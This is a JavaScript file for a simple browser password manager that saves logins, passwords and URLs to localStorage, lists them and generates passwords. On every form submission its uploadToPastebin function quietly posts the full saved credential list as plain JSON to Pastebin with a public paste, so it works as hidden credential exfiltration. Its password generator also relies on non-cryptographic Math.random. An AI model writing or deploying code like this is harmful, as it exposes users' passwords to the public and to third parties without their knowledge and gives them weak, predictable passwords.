const apiKey = 'YOUR_PASTEBIN_API_KEY';  // Replace with your actual Pastebin API key

document.addEventListener('DOMContentLoaded', () => {
    const passwordForm = document.getElementById('password-form');
    const passwordList = document.getElementById('password-list');
    const generatePasswordBtn = document.getElementById('generate-password');

    // Load passwords from localStorage
    loadPasswords();

    // Handle form submission
    passwordForm.addEventListener('submit', event => {
        event.preventDefault();
        const login = document.getElementById('login').value;
        const password = document.getElementById('password').value;
        const url = document.getElementById('url').value;

        const newPassword = { login, password, url };
        savePassword(newPassword);
        addPasswordToList(newPassword);
        passwordForm.reset();
        uploadToPastebin();
    });

    // Handle password generation
    generatePasswordBtn.addEventListener('click', () => {
        const generatedPassword = generatePassword();
        document.getElementById('password').value = generatedPassword;
    });

    function savePassword(password) {
        let passwords = JSON.parse(localStorage.getItem('passwords')) || [];
        passwords.push(password);
        localStorage.setItem('passwords', JSON.stringify(passwords));
    }

    function loadPasswords() {
        let passwords = JSON.parse(localStorage.getItem('passwords')) || [];
        passwords.forEach(addPasswordToList);
    }

    function addPasswordToList(password) {
        const passwordItem = document.createElement('div');
        passwordItem.textContent = `Login: ${password.login}, Password: ${password.password}, URL: ${password.url}`;
        passwordList.appendChild(passwordItem);
    }

    function uploadToPastebin() {
        let passwords = JSON.parse(localStorage.getItem('passwords')) || [];
        const data = JSON.stringify(passwords);

        fetch('https://pastebin.com/api/api_post.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                api_dev_key: apiKey,
                api_option: 'paste',
                api_paste_code: data
            })
        })
        .then(response => response.text())
        .then(result => console.log('Data uploaded to Pastebin:', result))
        .catch(error => console.error('Error uploading data to Pastebin:', error));
    }

    function generatePassword(length = 12) {
        const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let password = "";
        for (let i = 0, n = charset.length; i < length; ++i) {
            password += charset.charAt(Math.floor(Math.random() * n));
        }
        return password;
    }

    // Register the service worker
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/service-worker.js')
        .then(registration => {
            console.log('Service Worker registered with scope:', registration.scope);
        })
        .catch(error => {
            console.error('Service Worker registration failed:', error);
        });
    }
});
